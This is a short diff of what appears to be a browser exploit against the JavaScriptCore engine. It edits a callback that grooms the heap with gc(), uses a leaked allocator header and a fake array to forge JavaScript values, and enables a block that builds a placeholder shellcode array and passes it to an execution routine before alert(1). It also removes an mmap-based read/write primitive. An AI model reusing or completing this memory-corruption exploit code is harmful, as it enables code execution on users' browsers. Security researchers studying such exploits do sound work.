@@ -64,8 +64,8 @@ function callback(ev) {
     gc();
 
     /*
-    document.leakState();
-    document.leakState_160();
+    document.leakAllocator(64);
+    document.leakAllocator(160);
     return;
     */
 
@@ -107,7 +107,6 @@ function callback(ev) {
     // alert(leaked_header);
     overwrite_obj.g = Int64.JSC_as_JSValue(leaked_header);
 
-    /*
     sc = [];
     for (let i = 0; i < 40; ++i)
         sc.push(0x41);
@@ -120,15 +119,6 @@ function callback(ev) {
     }, leaked_header, sc);
 
     alert(1);
-    */
-
-    mmap(function(obj) {
-        overwrite_obj.j = obj;
-        return Int64.from_double(fake_arr[3]);
-    }, function(addr) {
-        fake_arr[3] = Int64.to_double(addr);
-        return overwrite_obj.j;
-    }, leaked_header);
 }
 
 
